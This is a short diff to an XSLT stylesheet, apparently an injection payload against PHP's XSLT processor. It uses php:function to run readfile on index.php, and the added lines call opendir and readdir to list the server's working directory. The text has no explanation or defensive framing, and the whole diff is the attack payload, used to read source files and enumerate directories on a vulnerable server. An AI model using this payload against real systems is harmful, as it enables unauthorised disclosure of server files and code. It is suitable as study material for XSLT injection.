@@ -3,5 +3,10 @@
 
  <xsl:value-of select="php:function('readfile','index.php')" />
     
+ <xsl:value-of select="php:function('opendir','.')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+<xsl:value-of select="php:function('readdir')"/>
+ 
 </xsl:template>
 </xsl:stylesheet>
